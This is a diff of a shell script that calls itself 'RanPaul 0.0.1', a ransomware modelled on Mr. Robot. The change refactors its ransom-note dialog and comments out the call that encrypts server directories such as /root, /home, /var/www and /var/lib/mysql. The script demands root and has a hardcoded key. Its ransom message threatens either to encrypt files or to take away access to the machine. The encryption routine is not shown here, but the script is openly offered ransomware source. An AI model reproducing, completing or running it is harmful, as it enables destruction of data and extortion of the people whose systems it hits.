@@ -21,6 +21,15 @@ notroot() {
 	adderr "[!] NOT ROOT"
 	EXIT
 }
+check_msg() {
+if [ "$(which dialog)" != "" ]; then
+	DIALOG=dialog
+elif [ "$(which whiptail)" != "" ]; then
+	DIALOG=whiptail
+else
+	DIALOG=none
+fi
+}
 check_req() {
 	# check the requirements
 	if [ "$(whoami)" != "root" ]; then
@@ -47,6 +56,7 @@ adderr() { ERRMSG="$ERRMSG\n$1"; }
 EXIT() { echo "[+] DUMPING MESSAGES:$ERRMSG\n[!] EXITING"; exit; }
 init() {
 	check_req
+	check_msg
 	KEY="PASSWORD"
 }
 navdir() {
@@ -61,34 +71,35 @@ for fil in $1; do
 done
 }
 showmess() {
-if [ "$(which dialog)" != "" ]; then
-	DIALOG=dialog
-elif [ "$(which whiptail)" != "" ]; then
-	DIALOG=whiptail
-else
-	DIALOG=none
-fi
-message="Congratulations Elliot,\nYou have been infected with a RANSOMWARE!!!!!\nI know. Scary stuff.\nAnyways, Im giving you a choice. You can either encrypt some important files, or lose access to your box and keep the files. Your choice kid.\nLove, Mr. Robot\n\nKeep the files?"
-title="Oops.."
 case "$DIALOG" in
-*dialog*)
+*none*)
+	reset
+	echo $2 "(y/N)"
+	read result
+	;;
+*)
 	$DIALOG --backtitle "RanPaul 0.0.1" \
-       		--title "$title" \
-       		--yesno "$message" 15 60
-        ;;
-*whiptail*)
-	$DIALOG --backtitle "RanPaul 0.0.1" \
-       		--title "$title" \
-       		--yesno "$message" 15 60
-        ;;
-	*)
-	echo NO MESSAGE!
+       		--title "$1" \
+       		--yesno "$2" 15 60
+        result=$?
 	;;
 esac
-if [ $? = 1 ]; then
-	echo thank you!
+case "$result" in
+Yes|Y|y)
+	echo You got the files, pal! goodbye now..
 	exit
-fi
+	;;
+0)
+	$DIALOG --backtitle "RanPaul 0.0.1" --msgbox "You got the files now, pal!\nGoodbye Elliot..." 10 50
+	;;	
+1)
+	$DIALOG --backtitle "RanPaul 0.0.1" --msgbox "Well Elliot,\nthe files are gone. You're gonna have to figure something out..." 10 50
+	;;	
+*)
+	echo "Well buddy, the files are gone. Youre gonna have to figure something out here...!"
+	exit
+	;;
+esac
 }
 ############### ENCRYPTING ###########################
 pck() {
@@ -140,8 +151,10 @@ main() {
 	SOFT="YES"
 	init
 	targets="/var/named /etc/mail /etc/postfix /var/www /root /home /var/lib/mysql"
-	enc_loop "$targets"
-	showmess
+	#enc_loop "$targets"
+	message="Congratulations Elliot,\nYou have been infected with a RANSOMWARE!!!!!\nI know. Scary stuff.\nAnyways, Im giving you a choice. You can either encrypt some important files, or lose access to your box and keep the files. Your choice kid.\nLove, Mr. Robot\n\nKeep the files?"
+	title="Oops.."
+	showmess "$title" "$message"
 	EXIT
 }
 main
